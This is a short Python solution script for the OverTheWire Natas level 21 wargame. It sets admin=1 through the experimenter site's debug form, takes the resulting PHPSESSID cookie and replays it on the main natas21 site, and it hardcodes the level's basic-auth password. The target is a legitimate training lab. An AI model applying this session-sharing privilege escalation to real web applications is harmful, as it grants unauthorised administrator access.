# exploit.

import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas21.natas.labs.overthewire.org/'
exp_url = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=Update&admin=1'
auth_info = HTTPBasicAuth('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')


response = requests.get(exp_url, auth = auth_info)
print("[*] Status Code: " + str(response.status_code))
session_cookie_value = response.cookies["PHPSESSID"]
print("[*] Session Cookie Value: " + str(session_cookie_value))
print("[*] Response Text: \n" + str(response.text))

response = requests.post(url, auth = auth_info, cookies = {"PHPSESSID":session_cookie_value})
print("[*] Main Host Response Text: \n" + str(response.text))

